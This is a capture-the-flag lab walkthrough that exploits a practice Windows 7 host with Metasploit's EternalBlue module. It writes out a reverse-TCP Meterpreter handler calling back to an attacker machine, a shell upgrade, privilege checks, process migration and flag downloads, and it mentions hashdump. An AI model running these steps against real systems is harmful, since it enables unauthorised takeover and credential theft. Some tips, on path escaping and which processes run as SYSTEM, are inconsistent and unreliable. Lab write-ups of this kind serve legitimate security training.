# Blue CTF Walkthrough

## Target Info
- **IP:** 10.201.47.14  
- **OS:** Windows 7 / Windows Server 2008 R2  
- **Open Ports (1–1000):**
| Port | Service       | Version                         |
|------|---------------|--------------------------------|
| 135  | msrpc         | Microsoft Windows RPC          |
| 139  | netbios-ssn   | Microsoft Windows netbios-ssn |
| 445  | microsoft-ds  | Windows 7–10 microsoft-ds      |

## Exploit & Payload
- **Exploit Used:** ms17_010_eternalblue  
- **Payload:** windows/x64/meterpreter/reverse_tcp  

- **Handler Setup:**
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <AttackBox-IP>
set LPORT <port>
exploit



- **Shell Upgrade to Meterpreter:**
use post/multi/manage/shell_to_meterpreter
set session 1
run



- **Confirm Meterpreter Session:**
sessions -i <meterpreter_session_id>
meterpreter >



## Post-Exploitation

### Check Privileges
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM



### List Processes
meterpreter > ps



### Migrate to a stable SYSTEM process
meterpreter > migrate <PID>
meterpreter > getuid


> Tip: Pick services.exe, winlogon.exe, or explorer.exe to avoid crashes.

## Flag Hunting

### Flag 1 (Desktop or C:\)
meterpreter > search -f Flag1.txt
meterpreter > cat C:\flag1.txt
meterpreter > download C:\flag1.txt



### Flag 2 (System folder)
meterpreter > search -f Flag2.txt
meterpreter > cat C:\Windows\System32\config\flag2.txt
meterpreter > download C:\Windows\System32\config\flag2.txt



### Flag 3 (Documents or key location)
meterpreter > search -f Flag3.txt
meterpreter > cat C:\Users\<Username>\Documents\flag3.txt
meterpreter > download C:\Users\<Username>\Documents\flag3.txt


> Important: Always use double backslashes `\\` or forward slashes `/` in Windows paths.

## Errata / Notes
- Some flags may disappear due to Windows quirks.  
- If `cat` fails or flag is missing:
  1. Terminate session: `exit`  
  2. Re-run the exploit to get a fresh shell  
  3. Upgrade shell → Meterpreter  
  4. Repeat flag search
- Migration may fail sometimes; try another SYSTEM-owned process.  

## Lessons Learned
1. Meterpreter upgrades provide advanced commands like `ps`, `getuid`, `hashdump`.  
2. Check privileges before migration to avoid losing SYSTEM access.  
3. Windows file paths in Meterpreter are tricky — stick to `C:\\` or `/`.  
4. Search for flags using `search -f <filename>` instead of manual browsing.  
5. Document all steps — makes future CTFs faster.
